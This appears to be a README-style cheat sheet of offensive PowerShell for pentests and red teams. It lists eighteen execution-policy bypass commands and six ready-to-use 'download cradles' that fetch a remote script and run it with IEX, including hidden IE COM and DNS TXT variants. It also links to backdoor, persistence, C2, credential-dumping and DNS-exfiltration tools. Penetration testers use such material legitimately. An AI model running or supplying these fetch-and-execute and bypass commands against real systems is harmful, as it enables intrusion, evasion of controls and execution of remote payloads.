# OffensivePowerShell
Powershell modules and commands that come in handy for pentests and red team assessments. 

## What is PowerShell Execution Policy?

PowerShell execution policies let you determine the conditions under which PowerShell loads configuration files and runs scripts.

You can set an execution policy for the local computer, for the current user, or for a particular session. You can also use a Group Policy setting to set execution policy for computers and users.

Execution policies for the local computer and current user are stored in the registry. You do not need to set execution policies in your PowerShell profile. The execution policy for a particular session is stored only in memory and is lost when the session is closed.

The execution policy is not a security system that restricts user actions. For example, users can easily circumvent a policy by typing the script contents at the command line when they cannot run a script. Instead, the execution policy helps users to set basic rules and prevents them from violating them unintentionally.

## Know your current execution policy

Fire up powershell.exe and type in:

`Get-ExecutionPolicy -List`

## Bypassing PowerShell Execution Policy

To bypass the Execution Policy fire in the following commands:

1. PowerShell.exe -noprofile -
2. powershell -nop
3. Powershell -command "Command"
4. Powershell -c
5. powershell.exe -EncodedCommand $EncodedCommand
6. invoke-command -scriptblock {Command}
7. invoke-command -computername Computername -scriptblock {get-executionpolicy} | set-executionpolicy -force
8. Get-Content .powershellfile.ps1 | Invoke-Expression
9. GC .powershellfile.ps1 | iex
10. PowerShell.exe -ExecutionPolicy Bypass
11. PowerShell.exe -ExecutionPolicy UnRestricted
12. PowerShell.exe -ExecutionPolicy Remote-signed
13. Disable-ExecutionPolicy
14. Powershell.exe Set-ExecutionPolicy Bypass
15. Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
16. Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
17. Powershell.exe -Exec Bypass
18. Changing the Registry : HKEY_CURRENT_USER\Software\MicrosoftPowerShell\1\ShellIds\Microsoft.PowerShell

## Download Cradles

Simple Download Cradle 

`IEX (New-Object Net.Webclient).downloadstring("path-to-pwsh-script")`

Simple Download Cradle For PowerShell 3.0+

`IEX (iwr 'path-to-pwsh-script')`

Hidden IE com object

`$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('path-to-pwsh-script');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r`

Msxml2.XMLHTTP COM object

`$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','path-to-pwsh-script',$false);$h.send();iex $h.responseText`

WinHttp COM object

`$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','path-to-pwsh-script',$false);$h.send();iex $h.responseText`

DNS TXT approach, code to execute needs to be a base64 encoded string stored in a TXT record

`IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))`

## PowerShell Modules

[nishang](https://github.com/samratashok/nishang) - Offensive PowerShell for penetration testing and offensive security.

[File System Security](https://gallery.technet.microsoft.com/scriptcenter/1abd77a5-9c0b-4a2b-acef-90dbb2b84e85) - Allows a much easier management of permissions on files and folders.

[PowerForensics](https://github.com/Invoke-IR/PowerForensics) - Popular live disk forensics platform for windows.

[PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - Post-exploitation framework.

[PowerShellEmpire](https://github.com/PowerShellEmpire/Empire) - Post-exploitation agent.

[PSReflect](https://github.com/mattifestation/PSReflect) - Easily define in-memory enums, structs, and Win32 functions in PowerShell. 

[ADRecon](https://github.com/sense-of-security/ADRecon) - ADRecon is a tool which gathers information about the Active Directory and generates a report which can provide a holistic picture of the current state of the target AD environment.

[BloodHound](https://github.com/BloodHoundAD/BloodHound) - Easily identify highly complex attack paths that would otherwise be impossible to quickly identify.

[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) - PowerShell command and script obfuscator.

[PowerBreach](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerBreach) - PowerBreach is a backdoor toolkit that aims to provide the user a wide variety of methods to backdoor a system.

[PowerShellArsenal](https://github.com/mattifestation/PowerShellArsenal) - A PowerShell Module Dedicated to Reverse Engineering

[Generate-Macro](https://github.com/enigma0x3/Generate-Macro) - Powershell script will generate a malicious Microsoft Office document with a specified payload and persistence method

[Invoke-AltDSBackdoor](https://github.com/enigma0x3/Invoke-AltDSBackdoor) - This script will obtain persistence on a Windows 7+ machine under both Standard and Administrative accounts by using two Alternate Data Streams

[Powershell-C2](https://github.com/enigma0x3/Powershell-C2) - A PowerShell script to maintain persistance on a Windows machine.

[mimikittenz](https://github.com/putterpanda/mimikittenz) - A post-exploitation powershell tool for extracting juicy info from memory.

[InsecurePowerShell](https://github.com/cobbr/InsecurePowerShell) - PowerShell with some security features removed. 

[PoshC2](https://github.com/nettitude/PoshC2) - Powershell C2 Server and Implants.

[p0wnedShell](https://github.com/Cn33liz/p0wnedShell) - PowerShell Runspace Post Exploitation Toolkit.

[DNSExfiltrator](https://github.com/Arno0x/DNSExfiltrator) - Data exfiltration over DNS request covert channel.

[PowerCat](https://github.com/secabstraction/PowerCat) - A PowerShell TCP/IP swiss army knife.
